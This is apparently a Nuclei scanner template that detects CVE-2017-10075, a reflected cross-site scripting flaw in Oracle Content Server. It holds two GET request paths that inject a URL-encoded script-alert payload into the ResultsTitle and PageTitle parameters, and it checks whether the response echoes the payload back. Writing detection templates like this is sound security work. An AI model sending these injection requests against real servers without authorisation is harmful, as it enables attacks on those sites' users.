id: CVE-2017-10075
info:
  author: madrobot
  classification:
    cve-id: CVE-2017-10075
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
    cvss-score: 8.2
  description: Oracle Content Server version 11.1.1.9.0, 12.2.1.1.0 and 12.2.1.2.0
    are susceptible to cross-site scripting. The vulnerability can be used to include
    HTML or JavaScript code in the affected web page. The code is executed in the
    browser of users if they visit the manipulated site.
  name: Oracle Content Server Cross-Site Scripting
  reference:
  - http://www.oracle.com/technetwork/security-advisory/cpujul2017-3236622.html
  - https://nvd.nist.gov/vuln/detail/CVE-2017-10075
  - http://www.securitytracker.com/id/1038940
  severity: high
  tags: cve,cve2017,xss,oracle
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - <script>alert(31337)</script>
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=OO'
  - '{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E'
